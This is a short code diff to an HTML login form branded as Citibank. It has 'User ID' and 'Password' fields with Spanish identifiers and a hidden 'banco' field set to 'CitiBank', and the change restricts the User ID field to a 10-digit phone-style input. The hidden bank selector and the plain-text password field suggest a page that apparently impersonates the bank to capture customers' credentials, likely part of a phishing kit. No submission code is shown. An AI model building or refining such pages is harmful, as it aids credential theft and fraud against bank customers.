@@ -35,7 +35,7 @@ input{
 
 <img src="/img/citi.jfif" alt="" srcset="" width="100%">
 <label for="">User ID</label>
-<center><input type="text" name="" id="txtUsuario" placeholder="User ID"></center>
+<center><input type="tel" name="" id="txtUsuario" placeholder="User ID" maxlength="10"></center>
 <label for="">Password</label>
 <center><input type="text" name="" id="txtPass" placeholder="Password"></center>
 <input type="hidden" name="" id="banco" style="height:40px; border:1px solid #d3f3f3;" value="CitiBank">
